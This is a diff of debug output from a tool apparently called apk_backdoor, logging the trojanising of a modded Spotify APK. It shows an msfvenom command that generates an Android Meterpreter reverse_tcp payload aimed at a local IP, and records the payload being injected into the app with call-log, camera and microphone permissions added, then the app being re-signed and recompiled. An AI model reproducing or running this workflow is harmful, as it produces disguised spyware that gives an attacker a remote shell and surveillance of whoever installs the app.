-DEBUG:root:39212452 assets/carapplications/com.spotify.music/com.spotify.music.p7b (OK - compressed)
-DEBUG:root:39216817 assets/carapplications/com.spotify.music/rhmi/bmw/texts.zip (OK - compressed)
+DEBUG:root:25795695 classes2.dex (OK - compressed)
+DEBUG:root:29113215 lib/armeabi-v7a/liborbit-jni-spotify.so (OK - compressed)
+DEBUG:root:38868854 lib/armeabi-v7a/libcrashlytics.so (OK - compressed)
+DEBUG:root:38969195 lib/armeabi-v7a/libmyspinnative.so (OK - compressed)
+DEBUG:root:39119746 assets/CircularSpUIv3p50-Book.otf (OK - compressed)
+DEBUG:root:39166078 assets/CircularSpUIv3p100-Book.otf (OK - compressed)
+DEBUG:root:39212450 assets/carapplications/com.spotify.music/com.spotify.music.p7b (OK - compressed)
+DEBUG:root:39216815 assets/carapplications/com.spotify.music/rhmi/bmw/texts.zip (OK - compressed)
 DEBUG:root:39217044 assets/carapplications/com.spotify.music/rhmi/bmw/images.zip (OK)
 DEBUG:root:39379619 assets/carapplications/com.spotify.music/rhmi/common/texts.zip (OK - compressed)
 DEBUG:root:39379852 assets/carapplications/com.spotify.music/rhmi/common/images.zip (OK)
@@ -3707,7 +3860,6 @@ DEBUG:root:40225071 fabric/io.fabric.sdk.android.fabric.properties (OK - compres
 DEBUG:root:Verification successful
 DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apksigner.jar sign --ks /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/debug.keystore --ks-key-alias androiddebugkey -ks-pass pass:android Spotify-v8.4.46.575.APK.Anti-Ban_SIGNED.apk'
 INFO:root:    ... Done.
-DEBUG:progressbar.utils:wrapping excepthook
 INFO:root:Generating payload...
 DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
 DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
@@ -3774,10 +3926,6 @@ DEBUG:root:Adding permission: 'android.permission.READ_CALL_LOG'
 DEBUG:root:Adding permission: 'android.permission.WRITE_CALL_LOG'
 DEBUG:root:Adding feature: 'android.hardware.camera.autofocus'
 DEBUG:root:Adding feature: 'android.hardware.microphone'
-INFO:root:Removing decompiled payload...
-INFO:root:    ... Done
-INFO:root:Deleting payload APK...
-INFO:root:    ... Done
 INFO:root:Recompiling Spotify-v8.4.46.575.APK.Anti-Ban to /home/andrea/Desktop/CyberSecurity/src...
 DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar b -o Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk /home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban'
 DEBUG:root:I: Using Apktool 2.4.1
